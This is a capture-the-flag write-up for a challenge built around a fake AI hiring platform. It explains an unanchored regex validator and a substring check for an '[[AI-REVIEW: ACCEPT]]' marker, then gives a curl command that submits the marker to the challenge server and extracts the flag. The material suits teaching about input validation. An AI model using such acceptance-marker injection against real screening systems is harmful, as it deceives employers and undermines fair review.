# [J*b Application](https://spooky.ctfd.io/challenges#J*b%20Application-23)

Welcome to the future of job applications! Here at AI Slop, we pride ourselves on streamlining the application process and helping candidates find their perfect role at our company using our AI-powered hiring platform. Submit your application and have our AI Slop screening system evaluate your life. We at AI Slop look forward to working with you in the future!

**Source review**

The cover letter is validated with:

```python
valid_letter = re.match(r"^[A-Za-z0-9 .,!?'-]{1,40}", coverletter)
```

`re.match` only anchors at the start. There is no `$` and no `fullmatch`, so only the first 1 to 40 characters need to be in the allowed set. The rest of the string is never checked.

The next check is a plain substring test:

```python
if "[[AI-REVIEW: ACCEPT]]" in coverletter:
    session["accepted"] = True
    return redirect(url_for("accepted"))
```

`/accepted` renders the flag when `session["accepted"]` is set.

**Exploit**

Start the cover letter with a valid prefix, then append the magic string. The resume is optional, so it can be left out. Use a cookie jar and `-L` so the session cookie is kept across the redirect to `/accepted`.

```bash
curl -L -b '' -F name=a -F email=a@a.com -F phone=1 -F address=x -F position=intern -F 'coverletter=Hello [[AI-REVIEW: ACCEPT]]' http://3.22.226.215/ | grep -o 'spooky{[^}]*}'
```

[SCREEN01]

The `&amp;` is HTML encoding of `&`.
